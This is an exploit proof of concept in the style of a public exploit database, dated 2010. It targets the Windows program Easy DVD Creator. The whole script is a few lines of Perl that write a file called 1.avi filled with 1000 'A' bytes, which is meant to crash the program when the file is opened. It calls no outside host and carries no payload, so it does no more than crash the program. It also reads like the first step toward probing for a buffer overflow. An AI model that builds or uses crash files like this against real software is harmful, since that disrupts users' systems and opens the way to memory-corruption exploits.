####
####
####Exploit Title: Easy DVD Creator Local Crash PoC
####Software Link: http://www.divxtodvd.net/dvd-creator.htm
####Tested on: Win XP SP3
####Date: 15-12-2010
####Author:  h1ch4m
####Email: h1ch4m@live.fr
####
####

my $file= "1.avi";
my $junk = "\x41" x 1000;
open($FILE,">$file");
print $FILE $junk;
close($FILE);
print "File Created successfully\n";
sleep(1);